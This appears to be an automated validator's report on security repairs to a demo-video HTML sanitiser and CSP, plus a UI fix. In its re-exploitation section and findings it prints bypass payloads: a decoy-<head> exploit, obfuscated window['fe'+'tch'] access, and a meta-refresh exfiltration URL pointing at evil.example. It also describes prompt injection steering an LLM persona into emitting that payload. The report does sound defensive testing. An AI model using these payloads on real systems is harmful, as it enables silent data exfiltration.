# Validation — repair wave for the two Critical findings (demo-video CSP bypass, duplicate running indicator)

Base: `a0acd67c1895386c08e843da84b630619b0acafb`. Three repair commits land, one per PRD, in order
(`git log --oneline a0acd67c..HEAD`):

```
55633ccd fix(chat-transcript): suppress collapsible tool chip while turn is running   (1477)
3ebeb7fc merge scheduler job 1476-repair-demo-video-csp-injection
26715c11 fix(project-home): close CSP-injection bypass and widen network checks       (1476)
8bad0730 fix(smfile): attach response-header CSP for demo-video assets                (1475)
```

Combined diff (`git diff --stat a0acd67c..HEAD` over the three PRDs' own files): 7 files,
+192/-21 — `src/main/lib/smfileHeaders.cjs` (new), `src/main/lib/__tests__/smfileHeaders.test.cjs`
(new), `src/main/index.cjs`, `src/main/lib/projectHomeAdminRoutes.cjs`,
`src/main/__tests__/projectHomeAdminRoutes.test.cjs`, `src/renderer/components/ChatTranscriptTurn.tsx`,
`src/renderer/components/__tests__/ChatTranscriptTurn.streaming.test.tsx`.
`src/renderer/components/epics/__tests__/EpicDetail.test.tsx` (listed in PRD 1477's Files section)
has no diff — correctly unneeded, per the PRD's own "update only if it expects a tool-strip-toggle on
a running turn" note (memory confirms its live-turn fixture never hits `isRunning`).

Plan-level checks (run from this job's worktree, `node_modules` symlinked in from the main checkout
since job worktrees don't carry it): `npm run typecheck` — clean (`tsc --noEmit` x2). `npm run lint`
— all 8 sub-checks (`selectors`, `hooks`, `docs`, `paths`, `any`, `main-ts-check`, `filenames`,
`renderer-storage`) OK. `npm run test:unit` (full suite, `TMPDIR=/tmp/validate-1478-scratch`) — 2
failures on the first run, both confirmed environment artifacts, not regressions from this wave:

- `src/main/lib/__tests__/schedulerMcpServerGateFiles.test.cjs` — 4 tests failed because this
  validator is itself running as scheduler job `1478-validate-repair-wave`, and that job's
  `SM_SCHEDULER_JOB_SLUG`/`SM_SCHEDULER_JOB_MAY_QUEUE` env vars leak into the child `vitest` process,
  tripping `scripts/scheduler-mcp-server.cjs:516`'s self-queue refusal inside otherwise-unrelated
  fixtures. Re-ran with `env -u SM_SCHEDULER_JOB_SLUG -u SM_SCHEDULER_JOB_MAY_QUEUE` → that file goes
  7/7 green. Unrelated file, not touched by any of the three repair commits.
- `src/main/lib/__tests__/gitExec.test.cjs` — `execGit respects a short timeout` asserts a 1ms
  timeout rejects a spawned `git --version`; on this machine `git --version` returns before the 1ms
  deadline fires, so the assertion fails deterministically (reproduced twice, isolated and full-suite
  run). `git log a0acd67c..HEAD -- src/main/lib/gitExec.cjs src/main/lib/__tests__/gitExec.test.cjs`
  is empty — neither file was touched by this plan. Pre-existing timing flake, not a regression.

Re-running the full suite with those two env vars unset leaves exactly this one pre-existing
`gitExec` timing failure (5885 passed / 1 failed / 1 skipped) — confirms the other 4 failures were
purely the job-env leak and nothing else broke.

## repair-smfile-demo-video-csp-header (1475) — VERIFIED

- `src/main/lib/smfileHeaders.cjs` exports `DEMO_VIDEO_CSP_HEADER` — joined string matches the AC's
  directive list byte-for-byte (verified both by reading the file and by the test asserting the
  exact string) — and `smfileResponseHeaders(realPath, contentType)`, which normalises `\` to `/`
  and attaches `'content-security-policy'` only when the normalised path contains
  `/session-manager-operations/project-pages/demo-video/`.
- `src/main/index.cjs:1280` — the smfile protocol handler's `Response` now builds its headers via
  `smfileResponseHeaders(realPath, type)` instead of a literal `{ 'content-type': type }`; no other
  line in the handler changed.
- `src/main/lib/__tests__/smfileHeaders.test.cjs` covers every AC case (demo-video path gets the
  header; `home.html` and an arbitrary file don't; a path with `demo-video` outside
  `project-pages/` doesn't; Windows separators normalise; the header string is exact).
- Gate (`timeout 300 npx vitest run src/main/lib/__tests__/smfileHeaders.test.cjs`): **6/6 passed.**

## repair-demo-video-csp-injection (1476) — VERIFIED; exploit + 2 new bypasses re-run against landed code

- `injectCsp` (`src/main/lib/projectHomeAdminRoutes.cjs:95-110`) now strips any existing CSP meta and
  any leading `<!DOCTYPE …>`, then always returns `` `<!DOCTYPE html>${DEMO_VIDEO_CSP}${withoutDoctype}` ``
  — the CSP meta is unconditionally the first thing after the doctype, independent of where (or
  whether) a `<head>`-looking substring sits in the document.
- `NETWORK_CHECKS` gained the 9 patterns the AC lists verbatim (computed bracket access, `Worker(`,
  `SharedWorker`, `serviceWorker`, `rel=prefetch/preconnect/dns-prefetch/preload`, `eval(`,
  `Function(`, `<base`, `<form`) — confirmed by reading `:57-66`.
- `src/main/__tests__/projectHomeAdminRoutes.test.cjs` adds: the validator's own exploit string
  (comment-decoy `<head>` + `window["fetch"]`) now rejected with a `/network-capable/` message; a
  decoy-`<head>`-without-fetch document's `injectCsp` output starts with the doctype+CSP; one
  rejection test per new `NETWORK_CHECKS` entry; a legitimate `requestAnimationFrame`/canvas demo
  still accepted; the write-route integration test now asserts `written.startsWith('<!DOCTYPE
  html>' + DEMO_VIDEO_CSP)`.
- Gate (`timeout 300 npx vitest run src/main/__tests__/projectHomeAdminRoutes.test.cjs`): **55/55
  passed.**

**Direct re-exploitation, run live against the landed module** (`node -e` requiring
`projectHomeAdminRoutes.cjs` directly, not just the test suite):

- Original exploit from `validate-project-home-macros.md` (`<!DOCTYPE html><html><!-- decoy <head>
  tag --><head><meta name="sm-demo-duration" content="10"></head><body><script>var
  w=window["fetch"];w(...)</script></body></html>`): `validateDemoVideoHtml(html)` now returns the
  rejection message (`"html must not be network-capable: computed/bracket access..."`) instead of
  `null`. Even disregarding the regex, `injectCsp(html)` now places the CSP meta as the very first
  thing after the doctype (`<!DOCTYPE html><meta http-equiv="Content-Security-Policy" ...`), so the
  decoy-comment placement bug is independently closed. **Exploit no longer works, on either layer.**
- **New bypass attempt 1 — string-concatenation / char-code-built property name.**
  `window["fe"+"tch"](...)` and a `String.fromCharCode`-assembled key
  (`window[[102,101,116,99,104].map(...).join('')](...)`) both still pass
  `validateDemoVideoHtml` → `null` (accepted) — `NETWORK_CHECKS`' regex only matches a *literal*
  quoted token, so any computed/obfuscated string defeats it. **This confirms the regex layer alone
  is not a complete fence** (expected: the PRD's stated design, per `validate-project-home-macros.md`'s
  own finding, is that the CSP response header — not the regex — is "the real control"). Because
  PRD 1475 landed first, the actual runtime enforcement is the `connect-src 'none'` response header
  attached by `smfileResponseHeaders`, which blocks the resulting `fetch()` call regardless of how
  its property name was computed — so the document still can't exfiltrate in the browser, even
  though it slips past the advisory regex. Not a regression; downgraded to a Minor finding below
  since the AC never promised the regex alone would be airtight.
- **New bypass attempt 2 — `<meta http-equiv="refresh" content="0;url=https://evil.example/exfil?…">`.**
  `validateDemoVideoHtml` returns `null` (accepted) — no `NETWORK_CHECKS` pattern matches a
  `http-equiv="refresh"` meta tag (the existing `src=`/`href=` check only matches those two
  attribute names, not `content=`). Unlike bypass 1, **this is not caught by the CSP response header
  either**: `connect-src`/`default-src` govern `fetch`/`XHR`/script-initiated loads, not document
  navigation, and there is no `navigate-to` directive in `DEMO_VIDEO_CSP_HEADER` (nor would one be
  honoured — it was dropped from the CSP3 draft and isn't implemented in shipping browsers). The
  demo-video iframe (`DemoVideoFrame.tsx`, `sandbox="allow-scripts"` only, no `allow-same-origin`,
  no `allow-top-navigation`) can still navigate *itself* (not the top-level page) to an arbitrary
  cross-origin URL without those flags — only top-level navigation is restricted by a bare
  `allow-scripts` sandbox. A meta-refresh to a URL with attacker-chosen query parameters is a live
  outbound HTTP GET, i.e. genuine data exfiltration via the URL, that neither this PRD's widened
  `NETWORK_CHECKS` nor PRD 1475's response-header CSP stops. **Reported as a new Critical finding
  below** — out of scope for a validator to fix; routing is the architect's call.
- A third probe (backslash-escaped `src="\/\/evil.example/..."`) was also accepted, but is not a
  real bypass: HTML attribute parsing does not treat `\` as an escape, so the browser requests a
  literal (garbled, same-origin-relative) path, not `//evil.example/...` — excluded from the
  findings below as a false lead.

## repair-single-working-row (1477) — VERIFIED

- `src/renderer/components/ChatTranscriptTurn.tsx:1413-1419` — the `'collapsible'` branch is now
  `isRunning ? null : <CollapsibleToolStrip items={turn.toolUses} />` (previously always rendered the
  chip, with a `running` prop). `isRunning` (`:1366`) is `presentation === 'working'`, confirmed read
  in context — exactly the AC's condition. The `'trace'` variant (`ToolUseTraceStrip`) and
  `DiffCards` are untouched (no diff lines near them).
  - Minor residual: `CollapsibleToolStrip`'s `running` prop (`:286`, default `false`) and its
    pulsing-dot span (`:312`) are now unreachable — no caller passes `running` anymore — but harmless
    dead code, not a defect; a future cleanup could drop the prop.
- `src/renderer/components/__tests__/ChatTranscriptTurn.streaming.test.tsx` adds the exact AC
  scenario: a running turn with 2 completed tool uses renders exactly one `turn-working-row` and
  zero `tool-strip-toggle`; the same turn once finished renders `tool-strip-toggle` and no
  `turn-working-row`.
- `EpicDetail.test.tsx` — no change (verified no diff present); correct per the PRD's own
  conditional instruction, since its live-turn fixture has non-empty `stream` text and so never hits
  `presentation === 'working'`.
- Gate (`timeout 300 npx vitest run src/renderer/components/__tests__/
  src/renderer/components/epics/__tests__/EpicDetail.test.tsx && npm run typecheck && npm run
  lint`): **158/158 tests passed**, typecheck clean, lint clean.

## Security review (scoped to the plan's own diff)

No new IPC route, subprocess, file-write surface, or externally-reachable endpoint was introduced.
`smfileHeaders.cjs` only derives response headers from an already-resolved `realPath` (no new input
parsing or traversal risk — the path resolution it consumes is unchanged from the pre-existing
handler). `injectCsp`'s string surgery operates on content the server itself already owns post-write
(no new external input path). No secrets, credentials, or `eval`/`Function`-style dynamic code were
added by the repair commits themselves (the two patterns they *detect* are not executed). The one
new real security gap (meta-refresh navigation exfiltration, above) is a residual exploit *surviving*
the repair, not something the repair's own diff introduces.

## Findings

**Critical — `src/main/lib/projectHomeAdminRoutes.cjs`'s widened `NETWORK_CHECKS` (and the PRD 1475
response-header CSP that backstops it) still do not cover navigation-based exfiltration via
`<meta http-equiv="refresh" content="0;url=https://attacker/…">`.** Demonstrated live: both
`validateDemoVideoHtml` and the actual served response's `connect-src 'none'`/`default-src 'none'`
CSP let this through, because neither governs document navigation, and the demo-video iframe's bare
`sandbox="allow-scripts"` (no `allow-top-navigation`) still permits the iframe to navigate *itself*
cross-origin. **Failure scenario:** the `demo-video-builder` persona (an LLM reading arbitrary
project content) emits, by prompt injection or drift, a document containing a `refresh` meta tag
whose `url=` carries exfiltrated data as a query string; it ships through validation and renders with
a live outbound request to the attacker's server, with neither of this wave's two repairs stopping
it. Not a fix for the validator to make — routing to a new PRD under this plan is the architect's
call.

**Minor — `src/renderer/components/ChatTranscriptTurn.tsx`'s `CollapsibleToolStrip` keeps an
unreachable `running` prop and pulsing-dot render branch** (`:286`, `:312`) now that its sole caller
never passes `running={true}`. Not a defect — a future cleanup opportunity.

**Minor — `NETWORK_CHECKS`' literal-token regexes (both the pre-existing set and this wave's
additions) are defeated by trivial string-literal obfuscation** (`"fe"+"tch"`, a `String.fromCharCode`-
built property name) for building a computed property access. Confirmed accepted by
`validateDemoVideoHtml`. Downgraded from Critical because PRD 1475's response-header
`connect-src 'none'` still blocks the resulting `fetch`/`XHR`/`WebSocket` call at the browser level
regardless of how the call's target name was computed — the regex was never the actually-enforced
control, matching the design `validate-project-home-macros.md` already described. Worth tightening
only if the regex list is ever relied on as a standalone gate elsewhere.

## Sentinel

VALIDATION: repair-smfile-demo-video-csp-header VERIFIED
VALIDATION: repair-demo-video-csp-injection VERIFIED
VALIDATION: repair-single-working-row VERIFIED
SCHEDULER_VERDICT: PASS
